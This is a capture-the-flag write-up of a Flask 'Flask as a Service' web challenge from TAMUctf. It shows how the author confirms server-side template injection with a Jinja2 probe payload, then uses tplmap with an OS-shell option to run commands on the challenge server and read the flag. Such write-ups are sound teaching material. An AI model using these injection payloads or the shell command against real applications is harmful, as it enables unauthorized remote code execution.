This was a web challenge with an estimated difficulty of "medium". Other than the difficulty, the only content in the challenge description was a link to the target web server.

Browsing to the web server reveals a page that reads "Welcome to my new FaaS! (Flask as a Service) Please enter the two chemicals you would like to combine: " and then two fields for Chemical One and Chemical Two. Using Burp Suite to intercept this POST request shows that the request and response look like this:

<code>
POST /science HTTP/1.1 </br>
Host: web3.tamuctf.com</br>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</br>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</br>
Accept-Language: en-US,en;q=0.5</br>
Accept-Encoding: gzip, deflate</br>
Referer: http://web3.tamuctf.com/</br>
Content-Type: application/x-www-form-urlencoded</br>
Content-Length: 15</br>
Connection: close</br>
Upgrade-Insecure-Requests: 1</br>

chem1=a&chem2=b</br>


HTTP/1.1 200 OK</br>
Server: nginx/1.15.8</br>
Date: Mon, 04 Mar 2019 13:33:53 GMT</br>
Content-Type: text/html; charset=utf-8</br>
Content-Length: 272</br>
Connection: close</br>

\<html>
        \<div style="text-align:center"></br>
        \<h3>The result of combining a and b is:\</h3>\</br></br>
        \<iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen>\</iframe>\</div></br>
        \</html>
</code>


Interestingly, user-provided output is reflected in the HTTP response. Given the reference to Flask, this suggested to me the possiblity of a Server-Side Teplate Injection vulnerability. To test for this futher, I made use of <a href="https://portswigger.net/blog/server-side-template-injection">this excellent blog post </a>from Portswigger.

The blog post recommends using a couple different payloads and seeing if they're interpreted by the templating engine before being reflected to the user. One of the recommended payloads is {{7*'7'}}. I sent this data via POST request:

<code>
chem1={{7*'7'}}&chem2={{7*'7'}}
</code>

The relevant portion of the response was:

<code>
The result of combining 7777777 and 7777777 is:</br>
</code>

Clearly, my input had been interpreted. This particular response indicates that the Jinja2 templating engine is in use. Rather than try to perform further exploitation by hand, I decided to take the opportunity to experiment with the tool TPLmap, which is an automated exploitation tool for SSTI vulnerabilities, much like SQLmap for SQL injection vulnerabilities. The tool can be found here:
https://github.com/epinna/tplmap

TPLmap has a feature that, after determining an injection point, will provide a pseudo-shell to the user to allow for easy remote code execution. To exploit the SSTI I'd identified, I used this command:

<code>
python tplmap.py -u "http://web3.tamuctf.com/science" -d "chem1=1&chem2=whatever" -e jinja2 --os-shell
</code>

This provided a shell, which allowed me to view the directory contents and grab the flag:

<code>
[+] Tplmap 0.5</br>
    Automatic Server-Side Template Injection Detection and Exploitation Tool</br>

[+] Testing if POST parameter 'chem1' is injectable</br>
[+] Jinja2 plugin is testing rendering with tag '{{*}}'</br>
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'</br>
[+] Tplmap identified the following injection point:</br>

  POST parameter: chem1</br>
  Engine: Jinja2</br>
  Injection: {{*}}</br>
  Context: text</br>
  OS: posix-linux2</br>
  Technique: render</br>
  Capabilities:</br>

   Shell command execution: ok</br>
   Bind and reverse shell: ok</br>
   File write: ok</br>
   File read: ok</br>
   Code evaluation: ok, python code</br>

[+] Run commands on the operating system.</br>
posix-linux2 $ ls</br>
config.py</br>
entry.sh</br>
flag.txt</br>
requirements.txt</br>
serve.py</br>
tamuctf</br>
posix-linux2 $ cat flag.txt</br>
gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}</br>
</code>
